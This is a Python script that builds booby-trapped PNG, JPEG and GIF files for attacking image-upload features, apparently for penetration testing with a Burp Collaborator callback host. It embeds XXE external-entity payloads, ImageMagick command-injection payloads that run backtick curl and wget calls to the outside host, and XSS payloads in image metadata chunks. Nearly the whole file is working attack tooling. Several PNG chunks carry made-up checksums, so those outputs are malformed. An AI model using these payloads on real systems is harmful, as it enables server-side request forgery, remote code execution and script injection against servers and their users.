from pathlib import Path
from PIL import Image
import struct

def generate_image_payloads(output_dir, ext, burp_collab):
    output_dir = Path(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)
    base_url = f"http://{burp_collab}"
    
    ssrf_dir = output_dir / 'ssrf'
    ssrf_dir.mkdir(exist_ok=True)
    xxe_dir = output_dir / 'xxe'
    xxe_dir.mkdir(exist_ok=True)
    rce_dir = output_dir / 'rce'
    rce_dir.mkdir(exist_ok=True)
    xss_dir = output_dir / 'xss'
    xss_dir.mkdir(exist_ok=True)
    
    if ext == 'png':
        img = Image.new('RGB', (100, 100), color='red')
        img_path = ssrf_dir / "ssrf1_itxt.png"
        img.save(img_path, 'PNG')
        
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        iTXt_chunk = f'XML:com.adobe.xmp\x00\x00<!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xxe-png">%x;]><xmp>test</xmp>'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        img_path = xxe_dir / "xxe1_itxt.png"
        img.save(img_path, 'PNG')
        
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        iTXt_chunk = f'XML:com.adobe.xmp\x00\x00<!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xxe-png">%x;]><xmp>test</xmp>'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        img_path = output_dir / "master.png"
        img.save(img_path, 'PNG')
        
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        iTXt_chunk = f'XML:com.adobe.xmp\x00\x00<!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xxe-png">%x;]><xmp>test</xmp>'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        img_path = rce_dir / "rce1_imagemagick.png"
        img.save(img_path, 'PNG')
        
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        exploit_payload = f'''push graphic-context
viewbox 0 0 640 480
fill \'url(https://{burp_collab}/rce-imagemagick?`curl {base_url}/rce-imagemagick`)'
pop graphic-context'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{exploit_payload.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        img_path = rce_dir / "rce2_imagemagick_delegate.png"
        img.save(img_path, 'PNG')
        
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        exploit_svg = f'''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="https://{burp_collab}/rce-delegate?`wget {base_url}/rce-delegate`" width="100" height="100"/>
</svg>'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{exploit_svg.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
        
        img_path = output_dir / "master2_rce.png"
        img.save(img_path, 'PNG')
        
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        exploit_payload = f'''push graphic-context
viewbox 0 0 640 480
fill \'url(https://{burp_collab}/rce-imagemagick?`curl {base_url}/rce-imagemagick`)'
pop graphic-context'''.encode('utf-8')
        
        iTXt_chunk = f'ImageMagick\x00\x00{exploit_payload.decode()}'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        exploit_svg = f'''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="https://{burp_collab}/rce-delegate?`wget {base_url}/rce-delegate`" width="100" height="100"/>
</svg>'''.encode('utf-8')
        
        iTXt_chunk2 = f'ImageMagick\x00\x00{exploit_svg.decode()}'.encode('utf-8')
        iTXt_length2 = struct.pack('>I', len(iTXt_chunk2))
        iTXt_type2 = b'iTXt'
        iTXt_crc2 = struct.pack('>I', 0x12345679)
        
        iend_pos2 = png_data.rfind(b'IEND')
        if iend_pos2 != -1:
            iend_chunk_start2 = iend_pos2 - 4
            new_chunk2 = iTXt_length2 + iTXt_type2 + iTXt_chunk2 + iTXt_crc2
            png_data[iend_chunk_start2:iend_chunk_start2] = new_chunk2
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
    
    elif ext == 'jpg':
        img = Image.new('RGB', (100, 100), color='red')
        img_path = ssrf_dir / "ssrf1_com.jpg"
        img.save(img_path, 'JPEG')
        
        with open(img_path, 'rb') as f:
            jpg_data = bytearray(f.read())
        
        com_marker = b'\xFF\xFE'
        com_payload = f'<!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xxe-jpg">%x;]><x>test</x>'.encode('utf-8')
        com_length = struct.pack('>H', len(com_payload) + 2)
        com_chunk = com_marker + com_length + com_payload
        
        soi_pos = jpg_data.find(b'\xFF\xD8')
        if soi_pos != -1:
            insert_pos = soi_pos + 2
            jpg_data[insert_pos:insert_pos] = com_chunk
        
        with open(img_path, 'wb') as f:
            f.write(jpg_data)
        
        img_path = xxe_dir / "xxe1_com.jpg"
        img.save(img_path, 'JPEG')
        
        with open(img_path, 'rb') as f:
            jpg_data = bytearray(f.read())
        
        com_marker = b'\xFF\xFE'
        com_payload = f'<!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xxe-jpg">%x;]><x>test</x>'.encode('utf-8')
        com_length = struct.pack('>H', len(com_payload) + 2)
        com_chunk = com_marker + com_length + com_payload
        
        soi_pos = jpg_data.find(b'\xFF\xD8')
        if soi_pos != -1:
            insert_pos = soi_pos + 2
            jpg_data[insert_pos:insert_pos] = com_chunk
        
        with open(img_path, 'wb') as f:
            f.write(jpg_data)
        
        img_path = output_dir / "master.jpg"
        img.save(img_path, 'JPEG')
        
        with open(img_path, 'rb') as f:
            jpg_data = bytearray(f.read())
        
        com_marker = b'\xFF\xFE'
        com_payload = f'<!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xxe-jpg">%x;]><x>test</x>'.encode('utf-8')
        com_length = struct.pack('>H', len(com_payload) + 2)
        com_chunk = com_marker + com_length + com_payload
        
        soi_pos = jpg_data.find(b'\xFF\xD8')
        if soi_pos != -1:
            insert_pos = soi_pos + 2
            jpg_data[insert_pos:insert_pos] = com_chunk
        
        with open(img_path, 'wb') as f:
            f.write(jpg_data)
    
    elif ext == 'gif':
        gif_header = b'GIF89a'
        gif_trailer = b'\x00;'
        
        comment_extension = b'\x21\xFE'
        comment_payload = f'<!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xxe-gif">%x;]><x>test</x>'.encode('utf-8')
        comment_length = bytes([min(len(comment_payload), 255)])
        comment_chunk = comment_extension + comment_length + comment_payload + b'\x00'
        
        gif_content = gif_header + comment_chunk + gif_trailer
        with open(ssrf_dir / "ssrf1_comment.gif", 'wb') as f:
            f.write(gif_content)
        
        gif_content = gif_header + comment_chunk + gif_trailer
        with open(xxe_dir / "xxe1_comment.gif", 'wb') as f:
            f.write(gif_content)
        
        gif_content = gif_header + comment_chunk + gif_trailer
        with open(output_dir / "master.gif", 'wb') as f:
            f.write(gif_content)
        
        comment_extension_xss = b'\x21\xFE'
        comment_payload_xss = b'<script>alert(1)</script>'
        comment_length_xss = bytes([min(len(comment_payload_xss), 255)])
        comment_chunk_xss = comment_extension_xss + comment_length_xss + comment_payload_xss + b'\x00'
        
        gif_content_xss = gif_header + comment_chunk_xss + gif_trailer
        with open(xss_dir / "xss1_comment.gif", 'wb') as f:
            f.write(gif_content_xss)
    
    if ext == 'jpg' or ext == 'jpeg':
        img = Image.new('RGB', (100, 100), color='red')
        img_path = xss_dir / "xss1_com.jpg"
        img.save(img_path, 'JPEG')
        
        with open(img_path, 'rb') as f:
            jpg_data = bytearray(f.read())
        
        com_marker = b'\xFF\xFE'
        com_payload = b'<script>alert(1)</script>'
        com_length = struct.pack('>H', len(com_payload) + 2)
        com_chunk = com_marker + com_length + com_payload
        
        soi_pos = jpg_data.find(b'\xFF\xD8')
        if soi_pos != -1:
            insert_pos = soi_pos + 2
            jpg_data[insert_pos:insert_pos] = com_chunk
        
        with open(img_path, 'wb') as f:
            f.write(jpg_data)
    
    if ext == 'png':
        img = Image.new('RGB', (100, 100), color='red')
        img_path = xss_dir / "xss1_itxt.svg.png"
        img.save(img_path, 'PNG')
        
        with open(img_path, 'rb') as f:
            png_data = bytearray(f.read())
        
        iTXt_chunk = f'iTXt\x00\x00<svg onload=alert(1)>'.encode('utf-8')
        iTXt_length = struct.pack('>I', len(iTXt_chunk))
        iTXt_type = b'iTXt'
        iTXt_crc = struct.pack('>I', 0x12345678)
        
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos != -1:
            iend_chunk_start = iend_pos - 4
            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
        
        with open(img_path, 'wb') as f:
            f.write(png_data)
